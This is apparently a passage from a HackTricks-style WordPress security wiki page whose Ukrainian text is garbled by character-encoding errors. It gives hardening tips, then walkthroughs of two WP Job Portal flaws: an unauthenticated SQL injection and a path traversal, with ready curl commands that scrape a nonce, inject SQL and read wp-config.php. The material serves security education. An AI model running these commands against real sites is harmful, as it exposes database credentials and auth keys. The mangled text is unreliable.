## WordPress Protection

### Regular Updates

–ü–µ—Ä–µ–∫–æ–Ω–∞–π—Ç–µ—Å—å, —â–æ WordPress, plugins, —ñ themes –æ–Ω–æ–≤–ª–µ–Ω—ñ –¥–æ –æ—Å—Ç–∞–Ω–Ω—ñ—Ö –≤–µ—Ä—Å—ñ–π. –¢–∞–∫–æ–∂ –ø—ñ–¥—Ç–≤–µ—Ä–¥—ñ—Ç—å, —â–æ automated updating —É–≤—ñ–º–∫–Ω–µ–Ω–æ –≤ wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
–¢–∞–∫–æ–∂, **–≤—Å—Ç–∞–Ω–æ–≤–ª—é–π—Ç–µ –ª–∏—à–µ –Ω–∞–¥—ñ–π–Ω—ñ –ø–ª–∞–≥—ñ–Ω–∏ —Ç–∞ —Ç–µ–º–∏ WordPress**.

### Security Plugins

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **–Ü–Ω—à—ñ —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü—ñ—ó**

- –í–∏–¥–∞–ª—ñ—Ç—å —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–≥–æ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞ **admin**
- –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ **–Ω–∞–¥—ñ–π–Ω—ñ –ø–∞—Ä–æ–ª—ñ** —Ç–∞ **2FA**
- –ü–µ—Ä—ñ–æ–¥–∏—á–Ω–æ **–ø–µ—Ä–µ–≥–ª—è–¥–∞–π—Ç–µ** **–ø—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø—É** –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—ñ–≤
- –û–±–º–µ–∂—Ç–µ **–∫—ñ–ª—å–∫—ñ—Å—Ç—å —Å–ø—Ä–æ–± –≤—Ö–æ–¥—É**, —â–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ Brute Force –∞—Ç–∞–∫–∞–º
- –ü–µ—Ä–µ–π–º–µ–Ω—É–π—Ç–µ —Ñ–∞–π–ª **`wp-admin.php`** —ñ –¥–æ–∑–≤–æ–ª—è–π—Ç–µ –¥–æ—Å—Ç—É–ø –ª–∏—à–µ –∑ –≤–Ω—É—Ç—Ä—ñ—à–Ω—å–æ—ó –º–µ—Ä–µ–∂—ñ –∞–±–æ –∑ –ø–µ–≤–Ω–∏—Ö IP-–∞–¥—Ä–µ—Å.


### –ù–µ–∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–æ–≤–∞–Ω–∞ SQL Injection —á–µ—Ä–µ–∑ –Ω–µ–¥–æ—Å—Ç–∞—Ç–Ω—é –≤–∞–ª—ñ–¥–∞—Ü—ñ—é (WP Job Portal <= 2.3.2)

–ü–ª–∞–≥—ñ–Ω WP Job Portal –¥–ª—è —Ä–µ–∫—Ä—É—Ç–∏–Ω–≥—É –≤—ñ–¥–∫—Ä–∏–≤ –∑–∞–¥–∞—á—É **savecategory**, —è–∫–∞ –≤—Ä–µ—à—Ç—ñ-—Ä–µ—à—Ç –≤–∏–∫–æ–Ω—É—î –Ω–∞—Å—Ç—É–ø–Ω–∏–π –≤—Ä–∞–∑–ª–∏–≤–∏–π –∫–æ–¥ —É `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ‚úó
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
–ü—Ä–æ–±–ª–µ–º–∏, –≤–∏–∫–ª–∏–∫–∞–Ω—ñ —Ü–∏–º —Ñ—Ä–∞–≥–º–µ–Ω—Ç–æ–º:

1. **–ù–µ–æ—á–∏—â–µ–Ω–∏–π –∫–æ—Ä–∏—Å—Ç—É–≤–∞—Ü—å–∫–∏–π –≤–≤—ñ–¥** ‚Äì `parentid` –±–µ—Ä–µ—Ç—å—Å—è –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –∑ HTTP-–∑–∞–ø–∏—Ç—É.
2. **–ö–æ–Ω–∫–∞—Ç–µ–Ω–∞—Ü—ñ—è —Ä—è–¥–∫—ñ–≤ —É WHERE-–∫–ª–∞—É–∑—ñ** ‚Äì –Ω–µ–º–∞—î `is_numeric()` / `esc_sql()` / prepared statement.
3. **–î–æ—Å—Ç—É–ø –±–µ–∑ –∞—É—Ç–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ü—ñ—ó** ‚Äì —Ö–æ—á–∞ –¥—ñ—è –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è —á–µ—Ä–µ–∑ `admin-post.php`, —î–¥–∏–Ω–∞ –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ ‚Äî **CSRF nonce** (`wp_verify_nonce()`), —è–∫–∏–π –±—É–¥—å-—è–∫–∏–π –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∑—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏, —â–æ –≤–±—É–¥–æ–≤—É—î —à–æ—Ä—Ç–∫–æ–¥ `[wpjobportal_my_resumes]`.

#### –ï–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è

1. –û—Ç—Ä–∏–º–∞—Ç–∏ —Å–≤—ñ–∂–∏–π nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. –í–ø—Ä–æ–≤–∞–¥—å—Ç–µ –¥–æ–≤—ñ–ª—å–Ω–∏–π SQL, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
–í—ñ–¥–ø–æ–≤—ñ–¥—å –≤–∏–¥–∞—î —Ä–µ–∑—É–ª—å—Ç–∞—Ç —ñ–Ω'—î–∫—Ü—ñ—ó –∑–∞–ø–∏—Ç—É –∞–±–æ –∑–º—ñ–Ω—é—î –±–∞–∑—É –¥–∞–Ω–∏—Ö, —â–æ –¥–æ–≤–æ–¥–∏—Ç—å –Ω–∞—è–≤–Ω—ñ—Å—Ç—å SQLi.


### Unauthenticated Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

–©–µ –æ–¥–Ω–µ –∑–∞–≤–¥–∞–Ω–Ω—è, **downloadcustomfile**, –¥–æ–∑–≤–æ–ª—è–ª–æ –≤—ñ–¥–≤—ñ–¥—É–≤–∞—á–∞–º –∑–∞–≤–∞–Ω—Ç–∞–∂—É–≤–∞—Ç–∏ **–±—É–¥—å-—è–∫–∏–π —Ñ–∞–π–ª –Ω–∞ –¥–∏—Å–∫—É** —á–µ—Ä–µ–∑ path traversal. –£—Ä–∞–∑–ª–∏–≤–∏–π sink –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` –∫–æ–Ω—Ç—Ä–æ–ª—é—î—Ç—å—Å—è –∞—Ç–∞–∫—É—é—á–∏–º —ñ –∫–æ–Ω–∫–∞—Ç–µ–Ω—É—î—Ç—å—Å—è **–±–µ–∑ —Å–∞–Ω—ñ—Ç–∏–∑–∞—Ü—ñ—ó**.  –ó–Ω–æ–≤—É –∂, —î–¥–∏–Ω–∏–º –±–∞—Ä'—î—Ä–æ–º —î **CSRF nonce**, —è–∫–∏–π –º–æ–∂–Ω–∞ –æ—Ç—Ä–∏–º–∞—Ç–∏ –∑—ñ —Å—Ç–æ—Ä—ñ–Ω–∫–∏ —Ä–µ–∑—é–º–µ.

#### Exploitation
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
–°–µ—Ä–≤–µ—Ä –ø–æ–≤–µ—Ä—Ç–∞—î –≤–º—ñ—Å—Ç —Ñ–∞–π–ª—É `wp-config.php`, –≤–Ω–∞—Å–ª—ñ–¥–æ–∫ —á–æ–≥–æ —Ä–æ–∑–∫—Ä–∏–≤–∞—é—Ç—å—Å—è DB credentials —ñ auth keys.

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset ‚Äì delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ‚â§ 5.6.1 ‚Äì Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation ‚Äì Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
